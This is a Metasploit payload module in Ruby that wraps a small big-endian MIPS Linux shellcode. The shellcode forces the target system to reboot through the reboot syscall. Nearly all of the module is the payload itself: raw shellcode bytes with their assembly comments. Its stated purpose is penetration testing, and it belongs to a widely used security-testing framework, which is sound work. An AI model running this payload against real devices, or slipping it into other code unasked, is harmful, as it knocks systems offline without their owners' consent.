##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule

  CachedSize = 32

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Reboot',
      'Description'   => %q{
            A very small shellcode for rebooting the system.
            This payload is sometimes helpful for testing purposes or executing
            other payloads that rely on initial startup procedures.
         },
      'Author'        =>
        [
          'Michael Messner <devnull[at]s3cur1ty.de>', #metasploit payload
          'rigan - <imrigan[at]gmail.com>'  #original payload
        ],
      'References'    =>
        [
          ['URL', 'http://www.shell-storm.org/shellcode/files/shellcode-795.php']
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_MIPSBE,
      'Payload'       =>
        {
          'Offsets' => {} ,
          'Payload' => ''
        })
    )
  end

  def generate
    shellcode =
      "\x3c\x06\x43\x21" +  #lui     a2,0x4321
      "\x34\xc6\xfe\xdc" +  #ori     a2,a2,0xfedc
      "\x3c\x05\x28\x12" +  #lui     a1,0x2812
      "\x34\xa5\x19\x69" +  #ori     a1,a1,0x1969
      "\x3c\x04\xfe\xe1" +  #lui     a0,0xfee1
      "\x34\x84\xde\xad" +  #ori     a0,a0,0xdead
      "\x24\x02\x0f\xf8" +  #li      v0,4088
      "\x01\x01\x01\x0c"    #syscall 0x40404

    return super + shellcode
  end
end
